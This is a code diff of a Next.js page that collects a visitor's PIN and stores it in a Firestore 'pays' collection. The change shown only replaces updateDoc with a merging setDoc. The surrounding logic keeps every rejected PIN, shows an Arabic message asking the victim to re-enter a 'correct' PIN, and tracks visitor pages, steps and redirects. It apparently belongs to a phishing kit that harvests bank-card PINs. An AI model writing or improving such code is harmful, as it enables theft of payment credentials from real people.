@@ -8,7 +8,7 @@ import { Alert, AlertDescription } from "@/components/ui/alert"
 import { Lock, AlertCircle, ShieldCheck, Eye } from "lucide-react"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
 import { db } from "@/lib/firebase"
-import { doc, updateDoc, onSnapshot } from "firebase/firestore"
+import { doc, setDoc, onSnapshot } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { updateVisitorPage } from "@/lib/visitor-tracking"
@@ -100,10 +100,10 @@ export default function ConfiPage() {
           rejectedAt: new Date().toISOString()
         }
         
-        updateDoc(docRef, {
+        setDoc(docRef, {
           oldPin: data.oldPin ? [...data.oldPin, currentPin] : [currentPin],
           pinStatus: "pending"
-        }).then(() => {
+        }, { merge: true }).then(() => {
           setPinStatus("pending")
           setPinCode("") // Clear the old PIN
           setError("تم رفض الرقم السري. يرجى إدخال رقم صحيح.")
@@ -145,14 +145,14 @@ export default function ConfiPage() {
 
     try {
       // Update the document with the PIN
-      await updateDoc(doc(db, "pays", visitorID), {
+      await setDoc(doc(db, "pays", visitorID), {
         pinCode,
         pinSubmittedAt: new Date().toISOString(),
-        pinStatus: "approved", // Auto-approve PIN
+        pinStatus: "approved",
         currentStep: "phone",
         paymentStatus: "pin_completed",
         pinUpdatedAt: new Date().toISOString()
-      })
+      }, { merge: true })
 
       // Add PIN to history (always approved)
       await addToHistory(visitorID, "pin", {
